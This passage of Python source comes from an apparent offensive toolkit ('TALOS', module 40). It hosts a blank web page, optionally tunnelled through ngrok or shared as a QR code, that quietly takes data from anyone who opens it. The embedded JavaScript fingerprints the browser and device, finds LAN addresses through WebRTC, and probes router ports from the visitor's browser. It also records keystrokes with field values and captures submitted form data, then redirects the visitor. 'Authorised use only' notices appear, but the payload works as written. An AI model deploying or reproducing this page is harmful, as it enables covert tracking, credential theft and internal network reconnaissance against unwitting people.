        c = _ANSI
        if tty:
            head = f"  {c['green']}[{stamp}]{c['reset']} COLLECT · {client}"
        else:
            head = f"  [{stamp}] COLLECT · {client}"
        print(head)
        rows = (
            _collect_details(payload)
            if isinstance(payload, dict)
            else [("raw", _clip(str(payload), 200))]
        )
        if not rows:
            return
        width = max(len(label) for label, _ in rows)
        for label, value in rows:
            if tty:
                print(f"  {c['dim']}│{c['reset']} {label.ljust(width)}  {value}")
            else:
                print(f"  |  {label.ljust(width)}  {value}")

    def stop(self) -> None:
        """Graceful shutdown: stop the HTTP server and the ngrok tunnel.

        Idempotent — safe to call from the wait loop's ``finally`` and again
        from :meth:`run`'s exception handlers.
        """
        self._stop_event.set()
        thread = self._server_thread
        server = self._server
        if thread is not None and thread.is_alive() and server is not None:
            try:
                server.shutdown()
            except Exception:  # pragma: no cover - defensive
                pass
        if server is not None:
            try:
                server.server_close()
            except Exception:  # pragma: no cover - defensive
                pass
        if thread is not None:
            try:
                thread.join(timeout=2)
            except Exception:  # pragma: no cover - defensive
                pass
        self._server = None
        self._server_thread = None
        if self._ngrok_proc is not None:
            try:
                self._ngrok_proc.terminate()
            except Exception:  # pragma: no cover - defensive
                pass
            self._ngrok_proc = None

    def _summary(self) -> Dict[str, Any]:
        """Structured summary returned in the ToolResult when the run ends."""
        with self._lock:
            collects = list(self._collects)
            events = list(self._events)
            clients = sorted(self._clients)
            request_count = self._request_count
            collect_count = self._collect_count
            log_count = self._log_count
        environment = collects[-1]["payload"] if collects else {}
        return {
            "url": self._url,
            "lan_urls": [f"http://{ip}:{self._port}" for ip in self._lan_ips],
            "blockers": list(self._blockers),
            "public_url": self._public_url or "",
            "redirect": self._redirect,
            "qrcode": self._qrcode,
            "qr_ascii": self._qr_ascii or "",
            # Orchestrator-driven runs (no banner callback) carry the startup
            # lines in the result so the operator still sees URL / QR / ngrok.
            **(
                {"banner": list(self._banner)}
                if self._banner_callback is None
                else {}
            ),
            "ngrok": bool(self._public_url),
            "requests": request_count,
            "collect_posts": collect_count,
            "log_posts": log_count,
            "clients": clients,
            "environment": environment if isinstance(environment, dict) else {},
            "events": [entry["payload"] for entry in events],
            "note": (
                "Interactive session — served a blank diagnostics page and "
                "streamed every request. Collected data came from browsers "
                "that opened the URL; use only with authorisation."
            ),
        }

    def _reset_state(self) -> None:
        """(Re)initialise all per-run state (also called from __init__)."""
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._request_count = 0
        self._collect_count = 0
        self._log_count = 0
        self._clients: set = set()
        self._collects: List[Dict[str, Any]] = []
        self._events: List[Dict[str, Any]] = []
        self._server = None
        self._server_thread = None
        self._ngrok_proc = None
        self._url = ""
        self._port = 0
        self._lan_ips: List[str] = []
        self._ngrok_requested = False
        self._blockers: List[str] = []
        self._public_url = ""
        self._redirect = DEFAULT_REDIRECT
        self._qrcode = False
        self._qr_ascii = ""
        self._banner: List[str] = []
        self._page = ""

    @property
    def page(self) -> str:
        """The rendered diagnostics page served at ``/``."""
        return self._page


def _ngrok_public_url() -> str:
    """Fetch the first http(s) tunnel from ngrok's local API (stdlib only)."""
    try:
        with urllib.request.urlopen(
            "http://127.0.0.1:4040/api/tunnels", timeout=1.5
        ) as response:
            data = json.loads(response.read().decode("utf-8"))
    except Exception:  # tunnel not up yet / API unreachable
        return ""
    for tunnel in data.get("tunnels") or []:
        public_url = str(tunnel.get("public_url") or "")
        if public_url.startswith(("http://", "https://")):
            return public_url
    return ""


# ===========================================================================
# the served page (HTML + JS diagnostics payload)
# ===========================================================================
_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title></title>
</head>
<body>
<script>
(function () {
  "use strict";
  var REDIRECT = __REDIRECT_JSON__;
  var COLLECT_URL = "/collect";
  var LOG_URL = "/log";
  // Bounce fast: redirect ~1.4s after load, without waiting for the
  // background LAN/connectivity probes and device extras to finish.
  var REDIRECT_AFTER_MS = 1400;

  // ---------- 1) browser environment (sent immediately) ------------------
  var env = {
    type: "environment",
    user_agent: navigator.userAgent || "",
    app_version: navigator.appVersion || "",
    vendor: navigator.vendor || "",
    platform: navigator.platform || "",
    language: navigator.language || "",
    languages: navigator.languages ? navigator.languages.slice(0, 10) : [],
    timezone: (function () {
      try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ""; }
      catch (e) { return ""; }
    })(),
    timezone_offset: new Date().getTimezoneOffset(),
    webdriver: !!navigator.webdriver,
    pdf_viewer_enabled: (navigator.pdfViewerEnabled === undefined) ? null : !!navigator.pdfViewerEnabled,
    plugins: (function () {
      try {
        var names = [];
        for (var i = 0; i < navigator.plugins.length && i < 8; i += 1) {
          names.push(navigator.plugins[i].name);
        }
        return names;
      } catch (e) { return []; }
    })(),
    user_agent_data: (function () {
      try {
        var ua = navigator.userAgentData;
        if (!ua) return null;
        return {
          brands: (ua.brands || []).map(function (b) { return b.brand + " " + b.version; }),
          platform: ua.platform || "",
          mobile: !!ua.mobile
        };
      } catch (e) { return null; }
    })(),
    connection: (function () {
      try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return null;
        return {
          effective_type: conn.effectiveType || "",
          downlink: conn.downlink || 0,
          rtt: conn.rtt || 0,
          save_data: !!conn.saveData
        };
      } catch (e) { return null; }
    })(),
    screen: {
      width: window.screen ? screen.width : 0,
      height: window.screen ? screen.height : 0,
      avail_width: window.screen ? screen.availWidth : 0,
      avail_height: window.screen ? screen.availHeight : 0,
      avail_left: window.screen ? screen.availLeft : 0,
      avail_top: window.screen ? screen.availTop : 0,
      color_depth: window.screen ? screen.colorDepth : 0,
      pixel_depth: window.screen ? screen.pixelDepth : 0,
      orientation: (function () {
        try {
          var o = window.screen ? screen.orientation : null;
          return o ? ((o.type || "") + " " + (o.angle || 0)).trim() : "";
        } catch (e) { return ""; }
      })()
    },
    viewport: {
      width: window.innerWidth || 0,
      height: window.innerHeight || 0,
      outer_width: window.outerWidth || 0,
      outer_height: window.outerHeight || 0,
      screen_x: window.screenX || 0,
      screen_y: window.screenY || 0,
      device_pixel_ratio: window.devicePixelRatio || 1
    },
    hardware_concurrency: navigator.hardwareConcurrency || 0,
    device_memory: navigator.deviceMemory || 0,
    max_touch_points: navigator.maxTouchPoints || 0,
    touch_support: ("ontouchstart" in window) || (navigator.maxTouchPoints > 0),
    online: navigator.onLine,
    cookies_enabled: navigator.cookieEnabled,
    history_length: history.length,
    location: location.href,
    referrer: document.referrer || "",
    performance: (function () {
      try {
        var entries = performance.getEntriesByType("navigation");
        var nav = entries.length ? entries[0] : null;
        if (!nav) return null;
        return {
          protocol: nav.nextHopProtocol || "",
          ttfb_ms: Math.round(nav.responseStart || 0),
          dom_content_loaded_ms: Math.round(nav.domContentLoadedEventEnd || 0),
          load_ms: Math.round(nav.loadEventEnd || 0),
          transfer_size: nav.transferSize || 0
        };
      } catch (e) { return null; }
    })(),
    webgl: (function () {
      try {
        var canvas = document.createElement("canvas");
        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return { supported: false };
        var ext = gl.getExtension("WEBGL_debug_renderer_info");
        return {
          supported: true,
          vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : (gl.getParameter(gl.VENDOR) || ""),
          renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : (gl.getParameter(gl.RENDERER) || "")
        };
      } catch (e) { return { supported: false }; }
    })()
  };

  // ---------- 2) local network discovery via WebRTC -----------------------
  var lanIps = [];
  function isPrivate(ip) {
    var parts = ip.split(".").map(Number);
    if (parts.length !== 4) return false;
    if (parts[0] === 10) return true;
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    if (parts[0] === 192 && parts[1] === 168) return true;
    return false;
  }
  function detectLan(callback) {
    if (typeof RTCPeerConnection === "undefined") { callback(); return; }
    var pc, done = false;
    function finish() {
      if (!done) { done = true; try { pc.close(); } catch (e) {} callback(); }
    }
    try { pc = new RTCPeerConnection({ iceServers: [] }); }
    catch (e) { callback(); return; }
    pc.onicecandidate = function (event) {
      if (!event.candidate) { finish(); return; }
      var match = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(event.candidate.candidate || "");
      if (!match) return;
      var ip = match[1];
      if (lanIps.indexOf(ip) === -1 && isPrivate(ip)) lanIps.push(ip);
    };
    setTimeout(finish, 1000);
    try {
      pc.createDataChannel("talos-diagnostics");
      pc.createOffer().then(function (offer) { return pc.setLocalDescription(offer); })
        .catch(finish);
    } catch (e) { finish(); }
  }

  // ---------- 3) local gateway connectivity probe -------------------------
  var PROBE_PORTS = [22, 80, 443, 8080, 3306, 5432, 5900, 6379];
  var probeResults = [];
  function gatewayCandidates() {
    var seen = {};
    ["192.168.1.1", "192.168.0.1", "10.0.0.1", "172.16.0.1"].forEach(function (g) { seen[g] = true; });
    lanIps.forEach(function (ip) {
      var parts = ip.split(".");
      if (parts.length === 4) seen[parts.slice(0, 3).join(".") + ".1"] = true;
    });
    return Object.keys(seen).slice(0, 4);
  }
  function probeGateways(callback) {
    var gateways = gatewayCandidates();
    if (!gateways.length) { callback(); return; }
    var pending = 0;
    gateways.forEach(function (gw) {
      PROBE_PORTS.forEach(function (port) {
        pending += 1;
        var controller = new AbortController();
        var timer = setTimeout(function () { controller.abort(); }, 700);
        fetch("http://" + gw + ":" + port + "/", {
          mode: "no-cors", cache: "no-store", signal: controller.signal
        })
          .then(function () { probeResults.push({ gateway: gw, port: port, reachable: true }); })
          .catch(function () { probeResults.push({ gateway: gw, port: port, reachable: false }); })
          .then(function () {
            clearTimeout(timer);
            pending -= 1;
            if (pending === 0) callback();
          });
      });
    });
  }

  // ---------- 4) UI event recorder ----------------------------------------
  var eventQueue = [];
  function describeTarget(target) {
    if (!target || !target.tagName) return "";
    var parts = [String(target.tagName).toLowerCase()];
    if (target.id) parts.push("#" + target.id);
    var cls = typeof target.className === "string" ? target.className.trim() : "";
    if (cls) parts.push("." + cls.split(/\\s+/).slice(0, 2).join("."));
    if (target.name) parts.push("[name=" + target.name + "]");
    if (target.value !== undefined && target.value !== "") parts.push("value=" + String(target.value).slice(0, 60));
    return parts.join("");
  }
  function pushEvent(event) {
    eventQueue.push(event);
    if (eventQueue.length >= 25) flushEvents();
  }
  function flushEvents() {
    if (!eventQueue.length) return Promise.resolve();
    var batch = eventQueue.splice(0, eventQueue.length);
    return post(LOG_URL, { type: "ui_events", events: batch }).catch(function () {});
  }
  document.addEventListener("keydown", function (ev) {
    pushEvent({ type: "keydown", key: ev.key, code: ev.code || "", target: describeTarget(ev.target), ts: Date.now() });
  }, true);
  document.addEventListener("click", function (ev) {
    pushEvent({ type: "click", target: describeTarget(ev.target), x: ev.clientX, y: ev.clientY, ts: Date.now() });
  }, true);
  setInterval(function () { flushEvents(); }, 600);

  function post(path, data) {
    return fetch(path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
      keepalive: true
    });
  }

  // ---------- 5) form data capture ----------------------------------------
  document.addEventListener("submit", function (ev) {
    try {
      var form = ev.target;
      var fields = {};
      var els = form.querySelectorAll("input, select, textarea");
      for (var i = 0; i < els.length; i += 1) {
        var el = els[i];
        if (!el.name) continue;
        if ((el.type === "checkbox" || el.type === "radio") && !el.checked) continue;
        fields[el.name] = el.value;
      }
      post(COLLECT_URL, { type: "form_data", action: form.action || location.href, fields: fields });
    } catch (e) { /* never block form submission */ }
  }, true);

  // ---------- 6) device extras (async, best-effort, posted as updates) -----
  function collectExtras(callback) {
    function withTimeout(promiseFactory) {
      return new Promise(function (resolve) {
        var timer = setTimeout(function () { resolve(null); }, 800);
        promiseFactory().then(function (value) {
          clearTimeout(timer);
          resolve(value);
        }).catch(function () {
          clearTimeout(timer);
          resolve(null);
        });
      });
    }
    var tasks = [
      withTimeout(function () {
        if (!navigator.storage || !navigator.storage.estimate) return Promise.resolve(null);
        return navigator.storage.estimate().then(function (estimate) {
          return { quota: estimate.quota || 0, usage: estimate.usage || 0 };
        });
      }),
      withTimeout(function () {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return Promise.resolve(null);
        return navigator.mediaDevices.enumerateDevices().then(function (devices) {
          var counts = { audioinput: 0, videoinput: 0, audiooutput: 0 };
          devices.forEach(function (device) {
            if (counts[device.kind] !== undefined) counts[device.kind] += 1;
          });
          return counts;
        });
      }),
      withTimeout(function () {
        if (!navigator.getBattery) return Promise.resolve(null);
        return navigator.getBattery().then(function (battery) {
          return {
            charging: !!battery.charging,
            level: Math.round((battery.level || 0) * 100),
            charging_time: battery.chargingTime,
            discharging_time: battery.dischargingTime
          };
        });
      }),
      withTimeout(function () {
        if (!document.fonts || !document.fonts.ready) return Promise.resolve(null);
        return document.fonts.ready.then(function () {
          var common = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Trebuchet MS", "Tahoma", "Consolas", "Segoe UI", "Roboto", "Helvetica"];
          var found = [];
          common.forEach(function (name) {
            try { if (document.fonts.check("16px " + name)) found.push(name); } catch (e) {}
          });
          return found;
        });
      }),
      withTimeout(function () {
        try {
          var canvas = document.createElement("canvas");
          canvas.width = 220;
          canvas.height = 40;
          var ctx = canvas.getContext("2d");
          if (!ctx) return Promise.resolve(null);
          ctx.textBaseline = "top";
          ctx.font = "14px Arial";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069";
          ctx.fillText("TALOS-fp-0123456789", 2, 15);
          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
          ctx.fillText("TALOS-fp-0123456789", 4, 17);
          var data = canvas.toDataURL();
          var hash = 5381;
          for (var i = 0; i < data.length; i += 1) {
            hash = ((hash << 5) + hash) ^ data.charCodeAt(i);
          }
          return Promise.resolve((hash >>> 0).toString(16));
        } catch (e) { return Promise.resolve(null); }
      })
    ];
    Promise.all(tasks).then(function (results) {
      callback({
        storage: results[0],
        media_devices: results[1],
        battery: results[2],
        fonts: results[3],
        canvas_fp: results[4]
      });
    });
  }

  // ---------- 7) boot: send env now, extras + probes in the background ----
  post(COLLECT_URL, env);
  collectExtras(function (extras) {
    env.extras = extras;
    post(COLLECT_URL, { type: "environment_update", extras: extras });
  });
  detectLan(function () {
    env.lan_ips = lanIps.slice();
    probeGateways(function () {
      env.connectivity = probeResults.slice();
      post(COLLECT_URL, {
        type: "environment_update",
        lan_ips: env.lan_ips,
        connectivity: env.connectivity
      });
    });
  });
  setTimeout(function () {
    flushEvents().then(function () {
      if (REDIRECT) { try { location.replace(REDIRECT); } catch (e) {} }
    });
  }, REDIRECT_AFTER_MS);
})();
</script>
</body>
</html>
"""


def _build_page(redirect: str) -> str:
    """Inject the redirect target (JSON-escaped) into the page template.

    ``json.dumps`` produces a valid JavaScript string literal, so arbitrary
    redirect URLs (quotes, backslashes, ``</script>`` sequences) are escaped
    safely and can never break out of the inline script.
    """
    return _PAGE_TEMPLATE.replace("__REDIRECT_JSON__", json.dumps(redirect or ""))


# ===========================================================================
# CLI menu wrapper (module 40) — configure, then open a hosting terminal
# ===========================================================================
def _ask(prompt: str, default: Optional[str] = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    try:
        return input(f"  {prompt}{suffix}: ").strip() or (default or "")
    except EOFError:
        return default or ""


def _yn(value: str) -> bool:
    return value.strip().lower() in ("y", "yes", "1", "true", "on")


def menu_data_scraper(session: Session) -> None:
    """CLI wrapper — local data scraper (module 40).

    Collects the configuration, then opens a **new terminal window** that
    runs the server in the foreground.  The page stays online on localhost
    until that window is closed; every connection is logged live inside it.
    """
    print("  Serves a BLANK data-collection page on localhost — the visitor")
    print("  sees nothing. Every connection (environment, LAN IPs, probes,")
    print("  UI events, form data) streams live to a NEW terminal window.")
    print("  Port-forward it (e.g. ssh -R, or --ngrok) to reach it remotely.")
    print("  AUTHORISED USE ONLY: the page collects data from whoever opens it.")
    print()
    port_text = _ask("Listen port", str(DEFAULT_PORT))
    redirect = _ask("Redirect URL after collection", DEFAULT_REDIRECT)
    qrcode = _ask("Print an ASCII QR code of the URL [y/n]", "n")
    ngrok = _ask("Expose via ngrok (if installed) [y/n]", "n")
    verbose = _ask("Verbose logging [y/n]", "n")
    print()

    try:
        port = _parse_port(port_text)
    except ToolError as exc:
        print(fmt.tag_error(str(exc)))
        return
    if not _port_available(port):
        print(fmt.tag_error(f"Port {port} is already in use — pick another port."))
        return

    argv = _server_argv(port, redirect, _yn(qrcode), _yn(ngrok), _yn(verbose))

    if not (sys.stdin.isatty() and sys.stdout.isatty()):
        # Piped / scripted session (or the self-test): don't pop GUI windows.
        print(fmt.tag_warn(
            "Not an interactive terminal — no window was opened. Start it "
            "manually with:"
        ))
        print(fmt.dim("  " + _display_command(argv)))
        return

    ok, detail = _spawn_server_terminal(argv)
    if not ok:
        print(fmt.tag_error(detail))
        print(fmt.dim("  Run it manually: " + _display_command(argv)))
        return

    print(fmt.tag_ok("Data scraper started in a new terminal window."))
    lan = _lan_ips()
    if lan:
        print(fmt.tag_info(
            f"Online at http://{lan[0]}:{port} — every device on this network "
            f"can connect (also http://127.0.0.1:{port}). Close the new window "
            "to take it offline; connections will stream into it."
        ))
    else:
        print(fmt.tag_info(
            f"Online at http://127.0.0.1:{port} — close the new window to take "
            "it offline; connections will stream into it."
        ))
    if _yn(ngrok):
        print(fmt.tag_info("ngrok tunnel will appear in the new window once up."))
    _wait_for_server(port)


def _script_path() -> Path:
    """Absolute path to the standalone data-scraper runner."""
    return Path(__file__).resolve().parents[2] / "scripts" / "data_scraper.py"


def _server_argv(
    port: int,
    redirect: str,
    qrcode: bool,
    ngrok: bool,
    verbose: bool,
) -> List[str]:
    """Build the argv the hosting terminal runs (the standalone server)."""
    argv = [sys.executable, str(_script_path()), "--port", str(port)]
    if redirect:
        argv += ["--redirect", redirect]
    if qrcode:
        argv.append("--qrcode")
    if ngrok:
        argv.append("--ngrok")
    if verbose:
        argv.append("-v")
    return argv


def _port_available(port: int) -> bool:
    """True when nothing is listening on 0.0.0.0:<port> right now."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind(("0.0.0.0", port))
        return True
    except OSError:
        return False


def _spawn_server_terminal(argv: List[str]) -> Tuple[bool, str]:
    """Open a new terminal window running ``argv`` (the server process).

    Tries the available terminal emulators in order — konsole, gnome-terminal,
    xterm on Linux, Terminal.app via ``osascript`` on macOS, a ``cmd`` window
    on Windows.  Returns ``(True, "")`` on success, or ``(False, reason)``
    when no terminal could be opened.
    """
    try:
        if os.name == "nt":
            subprocess.Popen(
                f'start "TALOS data scraper" cmd /k {subprocess.list2cmdline(argv)}',
                shell=True,
            )
            return True, ""
        if sys.platform == "darwin":
            inner = " ".join(
                shlex.quote(part).replace('"', '\\"') for part in argv
            )
            subprocess.Popen(
                [
                    "osascript",
                    "-e",
                    f'tell app "Terminal" to do script "{inner}"',
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            return True, ""
        for opener in (
            ["konsole", "-e", *argv],
            ["gnome-terminal", "--", *argv],
            ["xterm", "-e", *argv],
        ):
            try:
                subprocess.Popen(
                    opener, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                return True, ""
            except OSError:
                continue
        return False, (
            "no terminal emulator found (tried konsole, gnome-terminal, xterm)"
        )
    except OSError as exc:
        return False, f"could not open a terminal window: {exc}"


def _wait_for_server(port: int, timeout: float = 5.0) -> None:
    """Briefly poll the new server so the menu can confirm it came up."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with urllib.request.urlopen(
                f"http://127.0.0.1:{port}/", timeout=0.8
            ) as response:
                if response.status == 200:
                    print(fmt.tag_ok(
                        "Server is online — connections will stream into the "
                        "new window."
                    ))
                    return
        except Exception:
            time.sleep(0.25)
    print(fmt.tag_warn(
        "Could not confirm the server started — check the new terminal "
        "window for errors."
    ))